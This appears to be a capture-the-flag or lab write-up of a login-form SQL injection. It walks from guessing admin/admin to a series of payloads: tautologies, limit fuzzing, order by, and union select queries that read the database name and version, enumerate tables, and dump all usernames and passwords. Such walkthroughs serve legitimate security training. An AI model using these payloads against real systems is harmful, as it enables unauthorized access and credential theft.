In this chall we are greeted with a form or a login page which asks us to insert the username and password that is necessary for logging into the website.

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

We proceed by fuzzing with the inputs of the following fields and find that “admin” works in this case as both username and password.

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

We have successfully logged in but we need to break the query to proceed with the SQL based injection to extract or dump data from the database,

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

**PAYLOAD**: ‘ #

Although it doesnt show as logged in, we can still input a payload between the ‘ and # we can inject the payload.

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

**PAYLOAD**: ' or 1=1 #

Now adding the limit parameter we will be able to extract more data from the database, for which we will only need to fuzz the numeral part of the limit parameter.

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

Like so by using the following payload:

**PAYLOAD**: ' or 1=1 limit 1,2#

`                   `' or 1=1 limit 2,1#  etc…

Now before we dump all the passwords and the usernames we will need to find the number of columns that are present in the database using “order by”.

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

From this, we can predict that there are only 2 columns in the table and now we will use the parameter “union select”.

**PAYLOAD**: ' union select 1,2#

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

**PAYLOAD**: ' union select 1,database()#

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

**PAYLOAD**: ' union select 1,version()#

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

**PAYLOAD**: ' union select 1,table\_name from information\_schema.columns where table\_schema='security' limit 1,3#

We can see the table names by variating the limit.

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)

**PAYLOAD**: ' union select group\_concat(username),group\_concat(password) from users#

![](Aspose.Words.8154055a-2af0-470a-ae33-841830d8bd50.001.png)





